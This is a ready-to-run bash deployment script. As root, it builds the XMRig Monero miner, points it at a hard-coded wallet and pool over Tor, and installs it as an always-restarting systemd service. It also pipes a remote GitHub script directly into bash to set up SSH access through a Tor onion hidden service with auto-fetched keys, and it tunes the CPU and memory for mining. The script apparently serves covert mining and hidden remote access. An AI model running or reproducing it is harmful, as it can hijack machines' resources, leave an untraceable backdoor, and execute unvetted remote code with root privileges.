#!/bin/bash
set -euo pipefail

# ==========================================
# CONFIGURATION (Edit if needed)
# ==========================================
WALLET="47WAy3LX7uLU8Drp7LNDonBocgSq6MEpM97VwKaRqhiy1Co9PeQ63HdC2ecuhdhqSsYjrwbaZctFuMGfWgVcq6zGMGYg8oG"
WORKER="RAT KATFLOW"
POOL="gulf.moneroocean.stream:10008"
THREADS="18"

# Ensure we are root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root (sudo bash deploy-miner.sh)"
  exit 1
fi

echo "=========================================="
echo "   1. Installing Dependencies & Tor       "
echo "=========================================="
apt-get update -y
apt-get install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev tor linux-cpupower

# Run your ubuntukit Tor setup (auto-fetches your SSH keys)
echo "-> Setting up Tor SSH access via ubuntukit..."
curl -fsSL https://raw.githubusercontent.com/Catgirlmp3/ubuntukit/main/setup-tor-ssh.sh | bash

echo "=========================================="
echo "   2. Building XMRig from Source          "
echo "=========================================="
if [ ! -f /root/xmrig/build/xmrig ]; then
    cd /root
    git clone https://github.com/xmrig/xmrig.git
    mkdir -p xmrig/build
    cd xmrig/build
    cmake ..
    make -j$(nproc)
    echo "-> XMRig build complete."
else
    echo "-> XMRig already exists, skipping build."
fi

echo "=========================================="
echo "   3. Applying System Optimizations       "
echo "=========================================="
# Huge Pages (reserve 2MB pages based on your RAM, 1200 is safe for 64GB)
sysctl -w vm.nr_hugepages=1200
echo "-> Huge pages set to 1200 (2.4GB)."

# MSR Mod
modprobe msr 2>/dev/null || true
sysctl -w msr.allow_writes=on 2>/dev/null || true
echo "-> MSR module loaded and writes allowed."

# CPU Governor
cpupower frequency-set -g performance 2>/dev/null || true
echo "-> CPU governor set to performance."

echo "=========================================="
echo "   4. Creating Systemd Service            "
echo "=========================================="
cat <<EOF > /etc/systemd/system/xmrig.service
[Unit]
Description=XMRig Monero Miner (Tor)
After=network-online.target tor@default.service
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/xmrig/build
ExecStart=/root/xmrig/build/xmrig -o ${POOL} -u ${WALLET} -p ${WORKER} -x 127.0.0.1:9050 -k --threads ${THREADS}
Restart=always
RestartSec=30
Nice=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable xmrig.service
systemctl start xmrig.service

echo "=========================================="
echo "   5. Verification                        "
echo "=========================================="
echo "-> Tor Service: $(systemctl is-active tor@default)"
echo "-> SSH Service: $(systemctl is-active ssh)"
echo "-> XMRig Service: $(systemctl is-active xmrig)"
echo ""
echo "Your onion address for SSH is:"
cat /var/lib/tor/ssh_hidden_service/hostname 2>/dev/null || echo "Hidden service not found (check ubuntukit logs)."
echo ""
echo "Mining started on ${POOL} with worker '${WORKER}'. Monitor via journalctl -u xmrig -f"